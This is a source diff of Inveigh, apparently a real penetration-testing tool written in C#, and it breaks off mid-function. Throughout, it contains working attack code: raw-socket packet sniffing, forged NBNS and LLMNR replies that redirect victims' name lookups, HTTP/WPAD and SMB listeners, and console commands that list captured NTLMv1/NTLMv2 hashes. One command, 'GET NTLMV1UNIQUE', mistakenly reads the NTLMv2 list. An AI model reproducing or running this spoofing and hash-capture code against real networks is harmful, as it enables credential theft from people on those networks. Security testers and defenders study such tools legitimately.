@@ -2,124 +2,329 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
 using System.Threading;
 using System.Collections;
-using System.Collections.Concurrent;
+using System.Diagnostics;
+using System.Security.Principal;
 
 namespace Inveigh
 {
 
     class Program
     {
-        static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
-        static ConcurrentQueue<string> outputQueue = new ConcurrentQueue<string>();
-        static ConcurrentQueue<string> ntlmv1Queue = new ConcurrentQueue<string>();
-        static ConcurrentQueue<string> ntlmv2Queue = new ConcurrentQueue<string>();
+        public static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
+        public static Hashtable httpSessionTable = Hashtable.Synchronized(new Hashtable());
+        public static IList<string> outputList = new List<string>();
+        static IList<string> consoleList = new List<string>();
+        static IList<string> logList = new List<string>();
+        static IList<string> logFileList = new List<string>();
+        public static IList<string> ntlmv1List = new List<string>();
+        public static IList<string> ntlmv2List = new List<string>();
+        public static IList<string> ntlmv1FileList = new List<string>();
+        public static IList<string> ntlmv2FileList = new List<string>();
+        public static IList<string> ntlmv1UsernameList = new List<string>();
+        public static IList<string> ntlmv2UsernameList = new List<string>();
+        public static IList<string> ipCaptureList = new List<string>();
+        public static bool consoleOutput = true;
+        public static bool exitInveigh = false;
+        public static string[] parameterSpooferHostsIgnore;
+        public static string[] parameterSpooferHostsReply;
+        public static string[] parameterSpooferIPsIgnore;
+        public static string[] parameterSpooferIPsReply;
 
         static void Main(string[] args)
         {
-            string IP = null;
-            string spooferIP = null;
-            string[] nbnsTypes = { "00", "20" };
+            //parameters
+            string parameterChallenge = "";
+            string parameterElevatedPrivilege = "Auto";
+            string parameterFileOutput = "Y";
+            string parameterFileOutputDirectory = "";
+            string parameterFileUnique = "N";
+            string parameterHelp = "";
+            string parameterHTTP = "Y";
+            string parameterIP = "";
+            string parameterLLMNR = "Y";
+            string parameterMachineAccounts = "N";
+            string parameterNBNS = "Y";
+            string[] parameterNBNSTypes = { "00", "20" };
+            string parameterSMB = "Y";
+            string parameterSpooferIP = "";
+            string parameterSpooferRepeat = "Y";
+            string parameterRunCount = "0";
+            string parameterRunTime = "0";
+            string parameterWPADAuth = "NTLM";
+
+            string computerName = System.Environment.MachineName;
+            string netbiosDomain = System.Environment.UserDomainName;
+            string dnsDomain = "";
+
+            try
+            {
+                dnsDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
+            }
+            catch
+            {
+                dnsDomain = netbiosDomain;
+            }
 
             if (args.Length > 0)
             {
                 foreach (var entry in args.Select((value, index) => new { index, value }))
                 {
-                    string argument = entry.value.ToUpper();
+                    string parameter = entry.value.ToUpper();
 
-                    switch (argument)
+                    switch (parameter)
                     {
+                        case "-CHALLENGE":
+                        case "/CHALLENGE":
+                            parameterChallenge = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-ELEVATEDPRIVILEGE":
+                        case "/ELEVATEDPRIVILEGE":
+                            parameterElevatedPrivilege = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-FILEOUTPUT":
+                        case "/FILEOUTPUT":
+                            parameterFileOutput = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-FILEOUTPUTDIRECTORY":
+                        case "/FILEOUTPUTDIRECTORY":
+                            parameterFileOutputDirectory = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-FILEUNIQUE":
+                        case "/FILEUNIQUE":
+                            parameterFileUnique = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-HTTP":
+                        case "/HTTP":
+                            parameterHTTP = args[entry.index + 1].ToUpper();
+                            break;
 
                         case "-IP":
                         case "/IP":
-                            IP = args[entry.index + 1];
+                            parameterIP = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-LLMNR":
+                        case "/LLMNR":
+                            parameterLLMNR = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-MACHINEACCOUNTS":
+                        case "/MACHINEACCOUNTS":
+                            parameterMachineAccounts = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-NBNS":
+                        case "/NBNS":
+                            parameterNBNS = args[entry.index + 1].ToUpper();
                             break;
 
                         case "-NBNSTYPES":
                         case "/NBNSTYPES":
-                            nbnsTypes = args[entry.index + 1].Split(',');
+                            parameterNBNSTypes = args[entry.index + 1].ToUpper().Split(',');
+                            break;
+
+                        case "-RUNCOUNT":
+                        case "/RUNCOUNT":
+                            parameterRunCount = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-RUNTIME":
+                        case "/RUNTIME":
+                            parameterRunTime = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-SMB":
+                        case "/SMB":
+                            parameterSMB = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-SPOOFERHOSTSIGNORE":
+                        case "/SPOOFERHOSTSIGNORE":
+                            parameterSpooferHostsIgnore = args[entry.index + 1].ToUpper().Split(',');
+                            break;
+
+                        case "-SPOOFERHOSTSREPLY":
+                        case "/SPOOFERHOSTSREPLY":
+                            parameterSpooferHostsReply = args[entry.index + 1].ToUpper().Split(',');
                             break;
 
                         case "-SPOOFERIP":
                         case "/SPOOFERIP":
-                            spooferIP = args[entry.index + 1];
+                            parameterSpooferIP = args[entry.index + 1];
+                            break;
+
+                        case "-SPOOFERIPSIGNORE":
+                        case "/SPOOFERIPSIGNORE":
+                            parameterSpooferIPsIgnore = args[entry.index + 1].ToUpper().Split(',');
+                            break;
+
+                        case "-SPOOFERIPSREPLY":
+                        case "/SPOOFERIPSREPLY":
+                            parameterSpooferIPsReply = args[entry.index + 1].ToUpper().Split(',');
+                            break;
+
+                        case "-SPOOFERREPEAT":
+                        case "/SPOOFERREPEAT":
+                            parameterSpooferRepeat = args[entry.index + 1].ToUpper();
+                            break;
+
+                        case "-WPADAUTH":
+                        case "/WPADAUTH":
+                            parameterWPADAuth = args[entry.index + 1].ToUpper();
                             break;
 
                         case "-?":
                         case "/?":
-                            Console.WriteLine("Parameters:");
-                            Console.WriteLine("-IP              Primary IP address");
-                            Console.WriteLine("-NBNSTypes       Array of NBNS types to spoof");
-                            Console.WriteLine("-SpooferIP       IP address used in spoofed responses");
+                            if (args.Length > 1)
+                                parameterHelp = args[entry.index + 1].ToUpper();
+                            GetHelp(parameterHelp);
                             Environment.Exit(0);
                             break;
 
+                        default:
+                            if (parameter.StartsWith("-") || parameter.StartsWith("/"))
+                                throw new ArgumentException(paramName: parameter, message: "Invalid parameter");
+                            break;
                     }
 
                 }
             }
 
-            if(string.IsNullOrEmpty(IP))
+            int runCount = 0;
+            int runTime = 0;
+
+            if (parameterHTTP != "Y" && parameterHTTP != "N") throw new ArgumentException("HTTP value must be Y or N");
+            if (parameterLLMNR != "Y" && parameterLLMNR != "N") throw new ArgumentException("LLMNR value must be Y or N");
+            if (parameterMachineAccounts != "Y" && parameterMachineAccounts != "N") throw new ArgumentException("MachineAccounts value must be Y or N");
+            if (parameterNBNS != "Y" && parameterNBNS != "N") throw new ArgumentException("NBNS value must be Y or N");
+            if (parameterSMB != "Y" && parameterSMB != "N") throw new ArgumentException("SMB value must be Y or N");
+            try { runCount = Int32.Parse(parameterRunCount); } catch { throw new ArgumentException("RunCount value must be a integer"); }
+            try { runTime = Int32.Parse(parameterRunTime); } catch { throw new ArgumentException("RunTime value must be a integer"); }
+            if (parameterWPADAuth != "NTLM" && parameterWPADAuth != "NTLMNOESS" && parameterWPADAuth != "ANONYMOUS") throw new ArgumentException("WPADAuth value must be Anonymous, NTLM, or NTLMNoESS");
+
+            bool enabledFileOutput = false;
+            bool enabledHTTP = false;
+            bool enabledNBNS = false;
+            bool enabledLLMNR = false;
+            bool enabledMachineAccounts = false;
+            bool enabledSMB = false;
+            bool enabledSpooferRepeat = false;
+
+            if (String.Equals(parameterFileOutput, "Y")) { enabledFileOutput = true; }
+            if (String.Equals(parameterHTTP, "Y")) { enabledHTTP = true; }
+            if (String.Equals(parameterLLMNR, "Y")) { enabledLLMNR = true; }
+            if (String.Equals(parameterMachineAccounts, "Y")) { enabledMachineAccounts = true; }
+            if (String.Equals(parameterNBNS, "Y")) { enabledNBNS = true; }
+            if (String.Equals(parameterSMB, "Y")) { enabledSMB = true; }
+            if (String.Equals(parameterSpooferRepeat, "Y")) { enabledSpooferRepeat = true; }
+
+            if (string.IsNullOrEmpty(parameterIP))
             {
                 using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                 {
                     socket.Connect("203.0.113.1", 65530); // need better way
                     IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
-                    IP = endPoint.Address.ToString();
+                    parameterIP = endPoint.Address.ToString();
                 }
 
             }
 
-            if (string.IsNullOrEmpty(spooferIP))
+            if (string.IsNullOrEmpty(parameterSpooferIP))
             {
-                spooferIP = IP;
+                parameterSpooferIP = parameterIP;
             }
 
-            outputQueue.Enqueue(String.Format("[*] Inveigh started at {0}", DateTime.Now.ToString("s")));
-            outputQueue.Enqueue(String.Format("[+] Primary IP Address = {0}", IP));
-            outputQueue.Enqueue(String.Format("[+] Spoofer IP Address = {0}", spooferIP));
-            outputQueue.Enqueue(String.Format("[+] LLMNR Spoofer = Enabled"));
-            outputQueue.Enqueue(String.Format("[+] NBNS Spoofer For Types {0} = Enabled", string.Join(",",nbnsTypes)));
-            outputQueue.Enqueue(String.Format("[+] SMB Capture = Enabled"));
-            outputQueue.Enqueue(String.Format("[*] Press ESC to access console"));
+            bool isElevated;
 
-            Thread snifferSpooferThread = new Thread(() => SnifferSpoofer(IP,spooferIP,nbnsTypes));
-            snifferSpooferThread.Start();
-            bool consoleOutput = true;
+            if (String.Equals(parameterElevatedPrivilege, "Auto"))
+            {
+
+                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+                {
+                    WindowsPrincipal principal = new WindowsPrincipal(identity);
+                    isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
+                }
+
+            }
+            else if (String.Equals(parameterElevatedPrivilege, "Y"))
+            {
+                isElevated = true;
+            }
+            else
+            {
+                isElevated = false;
+            }
+
+            string optionStatus = "";
+            outputList.Add(String.Format("[*] Inveigh started at {0}", DateTime.Now.ToString("s")));
+            if (isElevated) optionStatus = "Enabled";
+            else optionStatus = "Disabled";
+            outputList.Add(String.Format("[+] Elevated Privilege Mode = {0}", optionStatus));
+            outputList.Add(String.Format("[+] Primary IP Address = {0}", parameterIP));
+            outputList.Add(String.Format("[+] Spoofer IP Address = {0}", parameterSpooferIP));
+            if (parameterSpooferHostsIgnore != null) outputList.Add(String.Format("[+] Spoofer Hosts Ignore = {0}", string.Join(",", parameterSpooferHostsIgnore)));
+            if (parameterSpooferHostsReply != null) outputList.Add(String.Format("[+] Spoofer Hosts Reply = {0}", string.Join(",", parameterSpooferHostsReply)));
+            if (parameterSpooferIPsIgnore != null) outputList.Add(String.Format("[+] Spoofer IPs Ignore = {0}", string.Join(",", parameterSpooferIPsIgnore)));
+            if (parameterSpooferIPsReply != null) outputList.Add(String.Format("[+] Spoofer IPs Reply = {0}", string.Join(",", parameterSpooferIPsReply)));
+            if (enabledLLMNR) optionStatus = "Enabled";
+            else optionStatus = "Disabled";
+            outputList.Add(String.Format("[+] LLMNR Spoofer = {0}", optionStatus));
+            if (enabledNBNS) outputList.Add(String.Format("[+] NBNS Spoofer For Types {0} = Enabled", string.Join(",", parameterNBNSTypes)));
+            else outputList.Add(String.Format("[+] NBNS Spoofer = Disabled"));
+            if (enabledHTTP) optionStatus = "Enabled";
+            else optionStatus = "Disabled";
+            outputList.Add(String.Format("[+] HTTP Capture = {0}", optionStatus));
+            outputList.Add(String.Format("[+] WPAD Authentication = {0}", parameterWPADAuth));
+            if (enabledSMB && isElevated) optionStatus = "Enabled";
+            else optionStatus = "Disabled";
+            outputList.Add(String.Format("[+] SMB Capture = {0}", optionStatus));
+            if (enabledMachineAccounts) optionStatus = "Enabled";
+            else optionStatus = "Disabled";
+            outputList.Add(String.Format("[+] Machine Account Capture = {0}", optionStatus));
+            if (runCount == 1) outputList.Add(String.Format("[+] Run Count = {0} Minute", runCount));
+            else if(runCount > 1) outputList.Add(String.Format("[+] Run Count = {0} Minutes", runCount));
+            if (runTime == 1) outputList.Add(String.Format("[+] Run Time = {0} Minute", runTime));
+            else if (runTime > 1) outputList.Add(String.Format("[+] Run Time = {0} Minutes", runTime));
+            outputList.Add(String.Format("[*] Press ESC to access console"));
+
+            if (isElevated && (enabledLLMNR || enabledNBNS || enabledSMB))
+            {
+                Thread snifferSpooferThread = new Thread(() => Sniffer.SnifferSpoofer(parameterIP, parameterSpooferIP, enabledLLMNR, enabledNBNS, parameterNBNSTypes, enabledSMB, enabledFileOutput, enabledSpooferRepeat, enabledMachineAccounts));
+                snifferSpooferThread.Start();
+            }
+            else
+            {
+                Thread nbnsListenerThread = new Thread(() => NBNS.NBNSListener(parameterIP, parameterSpooferIP, enabledNBNS, parameterNBNSTypes, enabledFileOutput));
+                nbnsListenerThread.Start();
+            }
+
+            Thread httpListenerThread = new Thread(() => HTTP.HTTPListener(parameterChallenge, computerName, dnsDomain, netbiosDomain, parameterWPADAuth, enabledFileOutput, enabledSpooferRepeat, parameterIP, enabledMachineAccounts));
+            httpListenerThread.Start();
+            Thread controlThread = new Thread(() => ControlLoop(runCount, runTime));
+            controlThread.Start();
+
+            if (enabledFileOutput)
+            {
+                Thread fileOutputThread = new Thread(() => FileOutput());
+                fileOutputThread.Start();
+            }
+
+            
 
             while (true)
             {
-                string output;
 
-                do
-                {
-                    while (consoleOutput && !Console.KeyAvailable)
-                    {
-                        bool success = outputQueue.TryDequeue(out output);
-
-                        if (success)
-                        {
-
-                            if (output.Contains("[*]"))
-                            {
-                                Console.ForegroundColor = ConsoleColor.Green;
-                                Console.WriteLine(output);
-                                Console.ResetColor();
-                            }
-                            else
-                            {
-                                Console.WriteLine(output);
-                            }
-
-                        }
-
-                    }
-                } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
+                OutputLoop();
 
                 consoleOutput = false;
                 int x = Console.CursorLeft;
@@ -135,34 +340,111 @@ namespace Inveigh
                 switch (inputCommand)
                 {
 
+                    case "GET CONSOLE":
+                        Console.Clear();
+                        {
+
+                            if (outputList.Count > 0)
+                            {
+
+                                if (outputList[0].Contains("[*]"))
+                                {
+                                    Console.ForegroundColor = ConsoleColor.Green;
+                                    Console.WriteLine(outputList[0]);
+                                    Console.ResetColor();
+                                }
+                                else
+                                {
+                                    Console.WriteLine(outputList[0]);
+                                }
+
+                                outputList.RemoveAt(0);
+
+                            }
+
+                        }
+                        break;
                     case "GET LOG":
                         Console.Clear();
-                        string[] outputLog = outputQueue.ToArray();
+                        string[] outputLog = logList.ToArray();
                         foreach (string entry in outputLog)
-                            Console.WriteLine(entry);
+                        {
+                            if (entry.Contains("[*]"))
+                            {
+                                Console.ForegroundColor = ConsoleColor.Green;
+                                Console.WriteLine(entry);
+                                Console.ResetColor();
+                            }
+                            else
+                            {
+                                Console.WriteLine(entry);
+                            }
+
+                        }
                         break;
 
                     case "GET NTLMV1":
                         Console.Clear();
-                        string[] outputNTLMV1 = ntlmv1Queue.ToArray();
+                        string[] outputNTLMV1 = ntlmv1List.ToArray();
                         foreach (string entry in outputNTLMV1)
                             Console.WriteLine(entry);
                         break;
 
+                    case "GET NTLMV1UNIQUE":
+                        Console.Clear();
+                        string uniqueNTLMv1Account = "";
+                        string uniqueNTLMv1AccountLast = "";
+                        string[] outputNTLMV1Unique = ntlmv2List.ToArray();
+                        Array.Sort(outputNTLMV1Unique);
+
+                        foreach (string entry in outputNTLMV1Unique)
+                        {
+                            uniqueNTLMv1Account = entry.Substring(0, entry.IndexOf(":", (entry.IndexOf(":") + 2)));
+
+                            if (!String.Equals(uniqueNTLMv1Account, uniqueNTLMv1AccountLast))
+                            {
+                                Console.WriteLine(entry);
+                            }
+
+                            uniqueNTLMv1AccountLast = uniqueNTLMv1Account;
+                        }
+                        break;
+
                     case "GET NTLMV2":
                         Console.Clear();
-                        string[] outputNTLMV2 = ntlmv2Queue.ToArray();
+                        string[] outputNTLMV2 = ntlmv2List.ToArray();
                         foreach (string entry in outputNTLMV2)
                             Console.WriteLine(entry);
+                        break;
+
+                    case "GET NTLMV2UNIQUE":
+                        Console.Clear();
+                        string uniqueNTLMv2Account = "";
+                        string uniqueNTLMv2AccountLast = "";
+                        string[] outputNTLMV2Unique = ntlmv2List.ToArray();
+                        Array.Sort(outputNTLMV2Unique);
+
+                        foreach (string entry in outputNTLMV2Unique)
+                        {
+                            uniqueNTLMv2Account = entry.Substring(0, entry.IndexOf(":", (entry.IndexOf(":") + 2)));
+
+                            if (!String.Equals(uniqueNTLMv2Account, uniqueNTLMv2AccountLast))
+                            {
+                                Console.WriteLine(entry);
+                            }
+
+                            uniqueNTLMv2AccountLast = uniqueNTLMv2Account;
+                        }
                         break;
 
                     case "?":
                     case "HELP":
                         Console.Clear();
+                        Console.WriteLine("GET CONSOLE = get queued console output");
                         Console.WriteLine("GET LOG = get Inveigh log");
                         Console.WriteLine("GET NTLMV1 = get captured NTLMv1 challenge/response hashes");
-                        Console.WriteLine("GET NTLMV1 = get captured NTLMv1 challenge/response hashes");
-                        Console.WriteLine("RESUME = resume real time consoule output");
+                        Console.WriteLine("GET NTLMV2 = get captured NTLMv2 challenge/response hashes");
+                        Console.WriteLine("RESUME = resume real time console output");
                         Console.WriteLine("STOP = stop Inveigh");
                         break;
 
@@ -171,6 +453,7 @@ namespace Inveigh
                         break;
 
                     case "STOP":
+                        Console.WriteLine(String.Format("[+] Inveigh exited at {0}", DateTime.Now.ToString("s")));
                         Environment.Exit(0);
                         break;
 
@@ -178,534 +461,281 @@ namespace Inveigh
                         Console.WriteLine("Invalid Command");
                         break;
                 }
-                
+
+                System.Threading.Thread.Sleep(5);
             }
+
         }
 
-        static void SnifferSpoofer(string snifferIP, string spooferIP, string[] nbnsTypes)
-        { 
-            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
-            Socket snifferSocket;
-            byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
-            byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
-            byte[] byteData = new byte[4096];
-            snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
-            snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
-            snifferSocket.ReceiveBufferSize = 4096;
-            IPEndPoint snifferEndPoint;
-
-            try
-            {
-                snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
-                snifferSocket.Bind(snifferEndPoint);
-            }
-            catch
-            {
-                Console.WriteLine("error");
-            }
-
-            snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
-            int packetData;
+        static void FileOutput()
+        {
+            string currentDirectory = System.IO.Directory.GetCurrentDirectory();
 
             while (true)
             {
 
-                try
+                if (logFileList.Count > 0)
                 {
-                    packetData = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
-                }
-                catch
-                {
-                    packetData = 0;
-                }
 
-                if (packetData > 0)
-                {
-                    MemoryStream memoryStream = new MemoryStream(byteData, 0, packetData);
-                    BinaryReader binaryReader = new BinaryReader(memoryStream);
-                    byte versionHL = binaryReader.ReadByte();
-                    binaryReader.ReadByte();
-                    uint totalLength = DataToUInt16(binaryReader.ReadBytes(2));
-                    binaryReader.ReadBytes(5);
-                    byte protocolNumber = binaryReader.ReadByte();
-                    binaryReader.ReadBytes(2);
-                    byte[] sourceIP = binaryReader.ReadBytes(4);
-                    IPAddress sourceIPAddress = new IPAddress(sourceIP);
-                    byte[] destinationIP = binaryReader.ReadBytes(4);
-                    IPAddress destinationIPAddress = new IPAddress(destinationIP);
-                    byte headerLength = versionHL;
-                    headerLength <<= 4;
-                    headerLength >>= 4;
-                    headerLength *= 4;
-
-                    switch (protocolNumber)
+                    using (StreamWriter outputFileLog = new StreamWriter(Path.Combine(currentDirectory, "Inveigh-Log.txt"), true))
                     {
-                        case 6:
-                            uint tcpSourcePort = DataToUInt16(binaryReader.ReadBytes(2));
-                            uint tcpDestinationPort = DataToUInt16(binaryReader.ReadBytes(2));
-                            binaryReader.ReadBytes(8);
-                            byte tcpHeaderLength = binaryReader.ReadByte();
-                            tcpHeaderLength >>= 4;
-                            tcpHeaderLength *= 4;
-                            binaryReader.ReadBytes(7);
-                            int tcpPayloadLength = (int)totalLength - (int)headerLength - (int)tcpHeaderLength;
-                            byte[] payloadBytes = binaryReader.ReadBytes(tcpPayloadLength);
-                            string challenge = "";
-                            string session = "";
-
-                            switch (tcpDestinationPort)
-                            {
-                                case 139:
-                                    break;
-
-                                case 445:
-                                    if (payloadBytes.Length > 0)
-                                    {
-                                        SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "445");
-                                    }
-
-                                    session = sourceIPAddress.ToString() + ":" +Convert.ToString(tcpSourcePort);
-
-                                    if (smbSessionTable.ContainsKey(session))
-                                    {
-                                        GetSMBNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort));
-                                    }
-                                    break;
-                            }
-
-                            switch (tcpSourcePort)
-                            {
-                                case 139:
-                                    break;
-
-                                case 445:
-                                    
-                                    if (payloadBytes.Length > 0)
-                                    {
-                                        challenge = GetSMBNTLMChallenge(payloadBytes);
-                                    }
-
-                                    session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);
-
-                                    if (challenge != "" && destinationIP != sourceIP)
-                                    {
-                                        smbSessionTable[session] = challenge;
-                                    }
-                                    break;
-                            }
-
-                            break;
-
-                        case 17:
-                            byte[] udpSourcePort = binaryReader.ReadBytes(2);
-                            uint endpointSourcePort = DataToUInt16(udpSourcePort);
-                            uint udpDestinationPort = DataToUInt16(binaryReader.ReadBytes(2));
-                            uint udpLength = DataToUInt16(binaryReader.ReadBytes(2));
-                            binaryReader.ReadBytes(2);
-                            byte[] udpPayload;
-
-                            try
-                            {
-                                udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
-                            }
-                            catch
-                            {
-                                udpPayload = new byte[2];
-                            }
-
-                            switch (udpDestinationPort)
-                            {
-                                case 137:
-
-                                    byte[] nbnsQuestionsAnswerRRs = new byte[4];
-                                    System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
-                                    byte[] nbnsAdditionalRRs = new byte[2];
-                                    System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);
-
-                                    if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
-                                    {
-                                        udpLength += 12;
-                                        byte[] nbnsTransactionID = new byte[2];
-                                        byte[] nbnsTTL = { 0x00, 0x00, 0x00, 0xa5 };
-                                        System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
-                                        byte[] nbnsRequestType = new byte[2];
-                                        System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
-                                        string nbnsQueryType = NBNSQueryType(nbnsRequestType);
-                                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
-                                        System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
-                                        string nbnsQueryHost = BytesToNBNSQuery(nbnsRequest);
-                                        string nbnsResponseMessage = "response sent";
-
-                                        if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
-                                        {
-                                            using (MemoryStream ms = new MemoryStream())
-                                            {
-                                                ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
-                                                ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
-                                                ms.Write(IntToByteArray2((int)udpLength), 0, 2);
-                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
-                                                ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
-                                                ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
-                                                ms.Write(nbnsRequest, 0, nbnsRequest.Length);
-                                                ms.Write(nbnsRequestType, 0, 2);
-                                                ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
-                                                ms.Write(nbnsTTL, 0, 4);
-                                                ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
-                                                ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                                ms.ToArray();
-                                                Socket nbnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
-                                                nbnsSendSocket.SendBufferSize = 1024;
-                                                IPEndPoint nbnsEndPoint = new IPEndPoint(sourceIPAddress, 137);
-                                                nbnsSendSocket.SendTo(ms.ToArray(), nbnsEndPoint);
-                                                nbnsSendSocket.Close();
-                                            }
-                                        }
-                                        else
-                                        {
-                                            nbnsResponseMessage = "NBNS type disabled";
-                                        }
-
-                                        outputQueue.Enqueue(String.Format("[+] {0} NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsQueryHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
-                                    }
-                                    break;
-
-                                case 5353:
-                                    break;
-
-                                case 5355:
-
-                                    byte[] llmnrType = new byte[2];
-                                    System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);
-
-                                    if (BitConverter.ToString(llmnrType) != "00-1C")
-                                    {
-                                        udpLength += (byte)(udpPayload.Length - 2);
-                                        Array.Reverse(udpSourcePort);
-                                        byte[] llmnrTTL = { 0x00, 0x00, 0x00, 0x1e };
-                                        byte[] llmnrTransactionID = new byte[2];
-                                        System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
-                                        byte[] llmnrRequest = new byte[udpPayload.Length - 18];
-                                        byte[] llmnrRequestLength = new byte[1];
-                                        System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
-                                        System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
-                                        string llmnrRequestHost = System.Text.Encoding.UTF8.GetString(llmnrRequest);
-                                        string llmnrResponseMessage = "response sent";
-                                        outputQueue.Enqueue(String.Format("[+] {0} LLMNR request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));
-
-                                        using (MemoryStream ms = new MemoryStream())
-                                        {
-                                            ms.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
-                                            ms.Write(udpSourcePort, 0, 2);
-                                            ms.Write(IntToByteArray2((int)udpLength), 0, 2);
-                                            ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
-                                            ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
-                                            ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
-                                            ms.Write(llmnrRequestLength, 0, 1);
-                                            ms.Write(llmnrRequest, 0, llmnrRequest.Length);
-                                            ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
-                                            ms.Write(llmnrRequestLength, 0, 1);
-                                            ms.Write(llmnrRequest, 0, llmnrRequest.Length);
-                                            ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
-                                            ms.Write(llmnrTTL, 0, 4);
-                                            ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
-                                            ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                            ms.ToArray();
-                                            Socket llmnrSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
-                                            llmnrSendSocket.SendBufferSize = 1024;
-                                            IPEndPoint llmnrEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
-                                            llmnrSendSocket.SendTo(ms.ToArray(), llmnrEndPoint);
-                                            llmnrSendSocket.Close();
-                                        }
-
-                                    }
-                                    break;
-
-                            }
-
-                            break;
+                        outputFileLog.WriteLine(logFileList[0]);
+                        outputFileLog.Close();
+                        logFileList.RemoveAt(0);
                     }
+
                 }
 
-            }
-
-        }
-
-        public static uint UInt16DataLength(int start, byte[] field)
-        {
-            byte[] fieldExtract = new byte[2];
-
-            if (field.Length > start + 2)
-            {
-                System.Buffer.BlockCopy(field, start, fieldExtract, 0, 2);
-            }
-
-            return BitConverter.ToUInt16(fieldExtract, 0);
-        }
-
-        public static uint UInt32DataLength(int start, byte[] field)
-        {
-            byte[] fieldExtract = new byte[4];
-            System.Buffer.BlockCopy(field, start, fieldExtract, 0, 4);
-            return BitConverter.ToUInt32(fieldExtract, 0);
-        }
-
-        public static uint DataToUInt16(byte[] field)
-        {
-            Array.Reverse(field);
-            return BitConverter.ToUInt16(field, 0);
-        }
-
-        public static string DataToString(int start, int length, byte[] field)
-        {
-            byte[] fieldExtract = new byte[length - 1];
-            System.Buffer.BlockCopy(field, start, fieldExtract, 0, fieldExtract.Length);
-            string payload = System.BitConverter.ToString(fieldExtract);
-            payload = payload.Replace("-00", String.Empty);
-            string[] payloadArray = payload.Split('-');
-            string payloadConverted = "";
-
-            foreach (string character in payloadArray)
-            {
-                payloadConverted += new System.String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
-            }
-
-            return payloadConverted;
-        }
-
-        public static byte[] IntToByteArray2(int field)
-        {
-            byte[] byteArray = BitConverter.GetBytes(field);
-            Array.Reverse(byteArray);
-            return byteArray.Skip(2).ToArray();
-        }
-
-        public static string BytesToNBNSQuery(byte[] field)
-        {
-            string nbnsUTF8 = BitConverter.ToString(field);
